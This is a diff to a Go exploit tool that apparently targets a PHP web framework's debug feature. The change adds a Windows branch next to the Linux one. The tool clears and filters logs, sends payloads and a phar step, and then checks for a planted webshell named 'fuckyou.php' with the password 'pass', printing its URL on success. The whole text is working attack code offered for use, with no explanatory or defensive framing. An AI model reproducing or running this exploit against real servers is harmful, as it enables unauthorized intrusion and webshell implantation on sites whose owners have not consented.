@@ -80,11 +80,7 @@ func path(url string) string {
 	reg1 := regexp.MustCompile(`\#\d*\ ((.*)(?:\/|\\))vendor`)
 	res := reg1.FindAllStringSubmatch(string(body1), 1)
 	fmt.Println(res[0][1])
-	if strings.Contains(res[0][0], ":") {
-		return "windows"
-	} else {
-		return "linux"
-	}
+	return res[0][1]
 }
 
 func main() {
@@ -102,8 +98,25 @@ func main() {
 	clearlog(url1)
 	clearlog(url1)
 	if strings.Contains(AA(url1).Status, "500") {
-		if path(url1) == "windows" {
-		} else if path(url1) == "linux" {
+		if strings.Contains(path(url1), ":") {
+			fmt.Println("[*] system: windows")
+			if strings.Contains(sendpayloadforwindows(url1).Status, "500") {
+				if strings.Contains(filterlog(url1).Status, "200") {
+					if strings.Contains(phar(url1, "/var/www").Status, "500") {
+						time.Sleep(time.Second * 1)
+						rep1, err := http.Get(string(url) + "/fuckyou.php")
+						if err != nil {
+							panic(err)
+						}
+						if strings.Contains(rep1.Status, "200") {
+							fmt.Println("[+] webshell url: ", string(url)+"/fuckyou.php,密码pass")
+						} else {
+							fmt.Println("[-] 漏洞不存在")
+						}
+					}
+				}
+			}
+		} else if !strings.Contains(path(url1), ":") {
 			fmt.Println("[*] system: linux")
 			if strings.Contains(sendpayloadforlinux(url1).Status, "500") {
 				if strings.Contains(filterlog(url1).Status, "200") {
